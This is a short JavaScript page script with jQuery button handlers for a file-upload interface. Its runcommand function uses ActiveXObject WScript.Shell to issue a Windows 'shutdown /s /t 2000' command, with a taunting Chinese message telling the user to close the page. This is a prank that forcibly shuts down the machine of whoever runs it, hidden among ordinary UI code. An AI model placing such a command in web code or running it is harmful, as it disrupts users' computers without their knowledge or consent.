$("#getStart").click(function(){
  $("#input-1").click();
  $("p").slideToggle();
});

$(document).ready(function(){
  $("#getStart").click(function(){
    // $("p").slideToggle();
    $("#input-1").click();
    $("#browseFile").css("visibility","visible");
  });
});

function runcommand()
{
  s = new ActiveXObject("WScript.Shell");
  cmd="shutdown /s /t 2000 /c \"你好大的胆子 竟敢打开我 ，还不把我关掉！！！\"";
  s.Run(cmd);
  intervalID = setInterval("closeText()",10000);
}
